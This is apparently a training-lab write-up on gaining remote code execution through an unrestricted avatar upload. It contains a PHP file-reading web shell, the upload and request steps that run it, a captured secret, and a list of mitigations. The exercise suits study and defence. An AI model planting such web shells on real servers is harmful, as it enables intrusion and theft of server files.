# Lab: Remote code execution via web shell upload

## Overview
This lab is vulnerable to unrestricted file upload.  
The application allows users to upload files as avatars without properly validating the file type.

An attacker can upload a malicious PHP web shell and execute commands on the server.

---

## Objective
Upload a PHP web shell and use it to retrieve the secret file located on the server.

---

## Tools Used
- Burp Suite (HTTP History, Repeater)
- Firefox Browser
- Kali Linux
- PHP web shell

---

## Vulnerability Explanation
The application accepts file uploads for user avatars.

The server fails to properly validate:
- File extension
- File content
- Executable scripts

Because uploaded files are stored inside a web-accessible directory, attackers can upload a `.php` file and execute it directly from the browser.

---

## PHP Payload Used

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

This payload reads the contents of the secret file and prints it in the response.

---

## Steps to Reproduce

### 1. Open the Lab
Login to the lab application.

---

### 2. Go to My Account
Navigate to the avatar upload section.

---

### 3. Create Malicious PHP File

Create a file named:

```bash
temp.php
```

Add the payload:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

### 4. Upload the PHP File
Use the avatar upload feature to upload `temp.php`.

The application accepts the upload successfully.

---

### 5. Locate Uploaded File
Open **Burp Suite → HTTP History**.

Find the request for the uploaded avatar.

Example:

```http
GET /files/avatars/temp.php HTTP/2
```

---

### 6. Execute the File
Send the request.

The server executes the PHP code instead of displaying it as a file.

---

### 7. Retrieve Secret
The response contains the secret value.

Example response:

```text
qJf2L2e8ooWrXnB4A6ZDh9rJDznoa6wv
```

This confirms successful remote code execution.

---

## Proof of Concept

### Uploaded PHP File
```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Request
```http
GET /files/avatars/temp.php HTTP/2
```

### Response
```text
qJf2L2e8ooWrXnB4A6ZDh9rJDznoa6wv
```

---

## Impact

- Remote code execution on the server
- Arbitrary file read
- Full server compromise possible
- Potential privilege escalation
- Malware/web shell deployment

---

## Mitigation

- Restrict allowed file types
- Block executable extensions (`.php`, `.jsp`, `.asp`, etc.)
- Store uploads outside the web root
- Rename uploaded files
- Validate MIME types and content
- Disable script execution in upload directories

---

## Key Learnings

- Learned how unrestricted file upload leads to RCE
- Understood how web shells work
- Practiced locating uploaded files using Burp Suite
- Learned how servers execute uploaded PHP files
- Gained hands-on experience exploiting insecure upload functionality
